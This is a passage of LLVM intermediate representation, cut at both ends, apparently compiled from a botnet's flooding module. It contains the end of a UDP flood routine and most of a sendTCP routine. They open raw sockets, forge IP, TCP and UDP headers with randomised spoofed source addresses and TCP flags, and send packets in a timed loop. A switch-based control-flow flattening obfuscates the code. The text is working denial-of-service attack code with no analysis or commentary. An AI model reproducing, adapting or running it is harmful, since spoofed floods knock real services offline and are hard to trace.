  %211 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %212 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %211, i32 0, i32 0
  %213 = bitcast %union.anon.2* %212 to %struct.anon.3*
  %214 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %213, i32 0, i32 1
  store i16 %210, i16* %214, align 2
  %215 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %216 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %215, i32 0, i32 0
  %217 = bitcast %union.anon.2* %216 to %struct.anon.3*
  %218 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %217, i32 0, i32 3
  store i16 0, i16* %218, align 2
  %219 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %220 = bitcast %struct.udphdr* %219 to i8*
  %221 = getelementptr inbounds i8, i8* %220, i64 8
  %222 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %221, i32 %222)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %223 = bitcast i8* %.reload8 to i16*
  %224 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 2
  %226 = load i16, i16* %225, align 2
  %227 = zext i16 %226 to i32
  %228 = call zeroext i16 @csum(i16* %223, i32 %227)
  %229 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 7
  store i16 %228, i16* %230, align 2
  %231 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %232 = load i32, i32* %11, align 4
  %233 = add nsw i32 %231, %232
  store i32 %233, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  store i32 1999141863, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  store i32 2037189704, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load i32, i32* %24, align 4
  %237 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %238 = call i64 @sendto(i32 %236, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %237, i32 16)
  %239 = call i32 @rand_cmwc()
  %240 = trunc i32 %239 to i16
  %241 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %242 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %241, i32 0, i32 0
  %243 = bitcast %union.anon.2* %242 to %struct.anon.3*
  %244 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %243, i32 0, i32 0
  store i16 %240, i16* %244, align 2
  %245 = load i32, i32* %10, align 4
  %246 = icmp eq i32 %245, 0
  %247 = select i1 %246, i32 1847070959, i32 -998437961
  store i32 %247, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = call i32 @rand_cmwc()
  store i32 -302672446, i32* %switchVar
  store i32 %249, i32* %.reg2mem12
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i32, i32* %10, align 4
  %252 = trunc i32 %251 to i16
  %253 = call zeroext i16 @htons(i16 zeroext %252) #13
  %254 = zext i16 %253 to i32
  store i32 -302672446, i32* %switchVar
  store i32 %254, i32* %.reg2mem12
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %256 = trunc i32 %.reload13 to i16
  %257 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %258 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %257, i32 0, i32 0
  %259 = bitcast %union.anon.2* %258 to %struct.anon.3*
  %260 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %259, i32 0, i32 1
  store i16 %256, i16* %260, align 2
  %261 = call i32 @rand_cmwc()
  %262 = trunc i32 %261 to i16
  %263 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 3
  store i16 %262, i16* %264, align 4
  %265 = load i32, i32* %27, align 4
  %266 = call i32 @GetRandomIP(i32 %265)
  %267 = call i32 @htonl(i32 %266) #13
  %268 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 8
  store i32 %267, i32* %269, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %270 = bitcast i8* %.reload6 to i16*
  %271 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 2
  %273 = load i16, i16* %272, align 2
  %274 = zext i16 %273 to i32
  %275 = call zeroext i16 @csum(i16* %270, i32 %274)
  %276 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 7
  store i16 %275, i16* %277, align 2
  %278 = load i32, i32* %32, align 4
  %279 = load i32, i32* %18, align 4
  %280 = icmp eq i32 %278, %279
  %281 = select i1 %280, i32 744012810, i32 1489371752
  store i32 %281, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  %283 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %284 = load i32, i32* %31, align 4
  %285 = icmp sgt i32 %283, %284
  %286 = select i1 %285, i32 1909302970, i32 1981200691
  store i32 %286, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 719902354, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  store i32 0, i32* %32, align 4
  store i32 1999141863, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i32, i32* %32, align 4
  %291 = add i32 %290, 1
  store i32 %291, i32* %32, align 4
  %292 = load i32, i32* %33, align 4
  %293 = load i32, i32* %15, align 4
  %294 = icmp eq i32 %292, %293
  %295 = select i1 %294, i32 508704529, i32 348361013
  store i32 %295, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i32, i32* %16, align 4
  %298 = mul nsw i32 %297, 1000
  %299 = call i32 @usleep(i32 %298)
  store i32 0, i32* %33, align 4
  store i32 1999141863, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  %301 = load i32, i32* %33, align 4
  %302 = add i32 %301, 1
  store i32 %302, i32* %33, align 4
  store i32 1999141863, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %304)
  store i32 -1264421948, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %303, %300, %296, %289, %288, %287, %282, %255, %250, %248, %235, %234, %209, %204, %202, %162, %156, %155, %151, %146, %141, %140, %139, %133, %132, %127, %126, %123, %119, %112, %111, %110, %105, %101, %97, %86, %76, %75, %67, %66, %61, %54, %53, %47, %42, %38, %first, %switchDefault
  br label %loopEntry
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

declare i32 @usleep(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  store i32 %28, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 574191284, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 574191284, label %first
    i32 -1724430105, label %31
    i32 -830426077, label %35
    i32 1900186920, label %40
    i32 -990320604, label %46
    i32 383172567, label %47
    i32 -947868304, label %54
    i32 1893853778, label %55
    i32 233574143, label %61
    i32 -737849491, label %62
    i32 -474738215, label %66
    i32 -1171213072, label %67
    i32 -530655362, label %73
    i32 827850429, label %121
    i32 -24976213, label %157
    i32 2017654133, label %160
    i32 18162043, label %164
    i32 1854627474, label %169
    i32 560348457, label %177
    i32 -1227895069, label %182
    i32 -2135500068, label %190
    i32 -1336786930, label %195
    i32 -1189027796, label %203
    i32 1885281569, label %208
    i32 1665597607, label %216
    i32 -1760268146, label %221
    i32 -480661055, label %229
    i32 -36099621, label %230
    i32 -298129489, label %231
    i32 2127774984, label %232
    i32 2044562410, label %233
    i32 -967437241, label %234
    i32 847845187, label %236
    i32 -277876972, label %237
    i32 1218732699, label %255
    i32 1965691336, label %257
    i32 -145960144, label %262
    i32 577377529, label %286
    i32 1550260384, label %287
    i32 56147030, label %334
    i32 23874718, label %339
    i32 -477408551, label %340
    i32 -352059398, label %341
    i32 1813720, label %344
    i32 -93671103, label %346
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %29 = icmp eq i32 %.reload, 0
  %30 = select i1 %29, i32 -1724430105, i32 -830426077
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  store i32 1900186920, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 1900186920, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 -990320604, i32 383172567
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -93671103, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 8, i32 4, i1 false)
  %50 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 1893853778, i32 -947868304
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 -93671103, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %56 = load i32, i32* %17, align 4
  %57 = bitcast i32* %18 to i8*
  %58 = call i32 @setsockopt(i32 %56, i32 0, i32 3, i8* %57, i32 4) #2
  %59 = icmp slt i32 %58, 0
  %60 = select i1 %59, i32 233574143, i32 -737849491
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 -93671103, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  %65 = select i1 %64, i32 -474738215, i32 -1171213072
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 -530655362, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %11, align 4
  %69 = sub nsw i32 32, %68
  %70 = shl i32 1, %69
  %71 = sub nsw i32 %70, 1
  %72 = xor i32 %71, -1
  store i32 %72, i32* %19, align 4
  store i32 -530655362, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %13, align 4
  %75 = sext i32 %74 to i64
  %76 = add i64 40, %75
  store i64 %76, i64* %.reg2mem2
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %78 = alloca i8, i64 %.reload4, align 16
  store i8* %78, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %79 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %79, %struct.iphdr** %21, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %81 = bitcast %struct.iphdr* %80 to i8*
  %82 = getelementptr i8, i8* %81, i64 20
  %83 = bitcast i8* %82 to %struct.tcphdr*
  store %struct.tcphdr* %83, %struct.tcphdr** %22, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %86 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %19, align 4
  %89 = call i32 @GetRandomIP(i32 %88)
  %90 = call i32 @htonl(i32 %89) #13
  %91 = load i32, i32* %13, align 4
  %92 = sext i32 %91 to i64
  %93 = add i64 20, %92
  %94 = trunc i64 %93 to i32
  call void @makeIPPacket(%struct.iphdr* %84, i32 %87, i32 %90, i8 zeroext 6, i32 %94)
  %95 = call i32 @rand_cmwc()
  %96 = trunc i32 %95 to i16
  %97 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon.0* %98 to %struct.anon.1*
  %100 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %99, i32 0, i32 0
  store i16 %96, i16* %100, align 4
  %101 = call i32 @rand_cmwc()
  %102 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon.0* %103 to %struct.anon.1*
  %105 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %104, i32 0, i32 2
  store i32 %101, i32* %105, align 4
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon.0* %107 to %struct.anon.1*
  %109 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %108, i32 0, i32 3
  store i32 0, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon.0* %111 to %struct.anon.1*
  %113 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %112, i32 0, i32 4
  %114 = load i16, i16* %113, align 4
  %115 = and i16 %114, -241
  %116 = or i16 %115, 80
  store i16 %116, i16* %113, align 4
  %117 = load i8*, i8** %12, align 8
  %118 = call i32 @strcmp(i8* %117, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.388, i32 0, i32 0)) #10
  %119 = icmp ne i32 %118, 0
  %120 = select i1 %119, i32 -24976213, i32 827850429
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon.0* %123 to %struct.anon.1*
  %125 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %124, i32 0, i32 4
  %126 = load i16, i16* %125, align 4
  %127 = and i16 %126, -513
  %128 = or i16 %127, 512
  store i16 %128, i16* %125, align 4
  %129 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %130 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %129, i32 0, i32 0
  %131 = bitcast %union.anon.0* %130 to %struct.anon.1*
  %132 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %131, i32 0, i32 4
  %133 = load i16, i16* %132, align 4
  %134 = and i16 %133, -1025
  %135 = or i16 %134, 1024
  store i16 %135, i16* %132, align 4
  %136 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i32 0, i32 0
  %138 = bitcast %union.anon.0* %137 to %struct.anon.1*
  %139 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %138, i32 0, i32 4
  %140 = load i16, i16* %139, align 4
  %141 = and i16 %140, -257
  %142 = or i16 %141, 256
  store i16 %142, i16* %139, align 4
  %143 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %144 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %143, i32 0, i32 0
  %145 = bitcast %union.anon.0* %144 to %struct.anon.1*
  %146 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %145, i32 0, i32 4
  %147 = load i16, i16* %146, align 4
  %148 = and i16 %147, -4097
  %149 = or i16 %148, 4096
  store i16 %149, i16* %146, align 4
  %150 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %151 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %150, i32 0, i32 0
  %152 = bitcast %union.anon.0* %151 to %struct.anon.1*
  %153 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %152, i32 0, i32 4
  %154 = load i16, i16* %153, align 4
  %155 = and i16 %154, -2049
  %156 = or i16 %155, 2048
  store i16 %156, i16* %153, align 4
  store i32 -277876972, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i8*, i8** %12, align 8
  %159 = call i8* @strtok(i8* %158, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %159, i8** %23, align 8
  store i32 2017654133, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = load i8*, i8** %23, align 8
  %162 = icmp ne i8* %161, null
  %163 = select i1 %162, i32 18162043, i32 847845187
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %23, align 8
  %166 = call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.390, i32 0, i32 0)) #10
  %167 = icmp ne i32 %166, 0
  %168 = select i1 %167, i32 560348457, i32 1854627474
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %171 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %170, i32 0, i32 0
  %172 = bitcast %union.anon.0* %171 to %struct.anon.1*
  %173 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %172, i32 0, i32 4
  %174 = load i16, i16* %173, align 4
  %175 = and i16 %174, -513
  %176 = or i16 %175, 512
  store i16 %176, i16* %173, align 4
  store i32 -967437241, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i8*, i8** %23, align 8
  %179 = call i32 @strcmp(i8* %178, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.391, i32 0, i32 0)) #10
  %180 = icmp ne i32 %179, 0
  %181 = select i1 %180, i32 -2135500068, i32 -1227895069
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %184 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %183, i32 0, i32 0
  %185 = bitcast %union.anon.0* %184 to %struct.anon.1*
  %186 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %185, i32 0, i32 4
  %187 = load i16, i16* %186, align 4
  %188 = and i16 %187, -1025
  %189 = or i16 %188, 1024
  store i16 %189, i16* %186, align 4
  store i32 2044562410, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i8*, i8** %23, align 8
  %192 = call i32 @strcmp(i8* %191, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.392, i32 0, i32 0)) #10
  %193 = icmp ne i32 %192, 0
  %194 = select i1 %193, i32 -1189027796, i32 -1336786930
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  %198 = bitcast %union.anon.0* %197 to %struct.anon.1*
  %199 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %198, i32 0, i32 4
  %200 = load i16, i16* %199, align 4
  %201 = and i16 %200, -257
  %202 = or i16 %201, 256
  store i16 %202, i16* %199, align 4
  store i32 2127774984, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i8*, i8** %23, align 8
  %205 = call i32 @strcmp(i8* %204, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.393, i32 0, i32 0)) #10
  %206 = icmp ne i32 %205, 0
  %207 = select i1 %206, i32 1665597607, i32 1885281569
  store i32 %207, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 0
  %211 = bitcast %union.anon.0* %210 to %struct.anon.1*
  %212 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %211, i32 0, i32 4
  %213 = load i16, i16* %212, align 4
  %214 = and i16 %213, -4097
  %215 = or i16 %214, 4096
  store i16 %215, i16* %212, align 4
  store i32 -298129489, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i8*, i8** %23, align 8
  %218 = call i32 @strcmp(i8* %217, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.394, i32 0, i32 0)) #10
  %219 = icmp ne i32 %218, 0
  %220 = select i1 %219, i32 -480661055, i32 -1760268146
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 0
  %224 = bitcast %union.anon.0* %223 to %struct.anon.1*
  %225 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %224, i32 0, i32 4
  %226 = load i16, i16* %225, align 4
  %227 = and i16 %226, -2049
  %228 = or i16 %227, 2048
  store i16 %228, i16* %225, align 4
  store i32 -36099621, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  store i32 -36099621, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  store i32 -298129489, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  store i32 2127774984, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  store i32 2044562410, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  store i32 -967437241, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %235, i8** %23, align 8
  store i32 2017654133, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  store i32 -277876972, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = call i32 @rand_cmwc()
  %239 = trunc i32 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon.0* %241 to %struct.anon.1*
  %243 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %242, i32 0, i32 5
  store i16 %239, i16* %243, align 2
  %244 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 0
  %246 = bitcast %union.anon.0* %245 to %struct.anon.1*
  %247 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %246, i32 0, i32 6
  store i16 0, i16* %247, align 4
  %248 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 0
  %250 = bitcast %union.anon.0* %249 to %struct.anon.1*
  %251 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %250, i32 0, i32 7
  store i16 0, i16* %251, align 2
  %252 = load i32, i32* %9, align 4
  %253 = icmp eq i32 %252, 0
  %254 = select i1 %253, i32 1218732699, i32 1965691336
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = call i32 @rand_cmwc()
  store i32 -145960144, i32* %switchVar
  store i32 %256, i32* %.reg2mem10
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i32, i32* %9, align 4
  %259 = trunc i32 %258 to i16
  %260 = call zeroext i16 @htons(i16 zeroext %259) #13
  %261 = zext i16 %260 to i32
  store i32 -145960144, i32* %switchVar
  store i32 %261, i32* %.reg2mem10
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %263 = trunc i32 %.reload11 to i16
  %264 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 0
  %266 = bitcast %union.anon.0* %265 to %struct.anon.1*
  %267 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %266, i32 0, i32 1
  store i16 %263, i16* %267, align 2
  %268 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %269 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %270 = call zeroext i16 @tcpcsum(%struct.iphdr* %268, %struct.tcphdr* %269)
  %271 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon.0* %272 to %struct.anon.1*
  %274 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %273, i32 0, i32 6
  store i16 %270, i16* %274, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %275 = bitcast i8* %.reload8 to i16*
  %276 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 2
  %278 = load i16, i16* %277, align 2
  %279 = zext i16 %278 to i32
  %280 = call zeroext i16 @csum(i16* %275, i32 %279)
  %281 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 7
  store i16 %280, i16* %282, align 2
  %283 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %284 = load i32, i32* %10, align 4
  %285 = add nsw i32 %283, %284
  store i32 %285, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 577377529, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 1550260384, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i32, i32* %17, align 4
  %289 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %290 = call i64 @sendto(i32 %288, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %289, i32 16)
  %291 = load i32, i32* %19, align 4
  %292 = call i32 @GetRandomIP(i32 %291)
  %293 = call i32 @htonl(i32 %292) #13
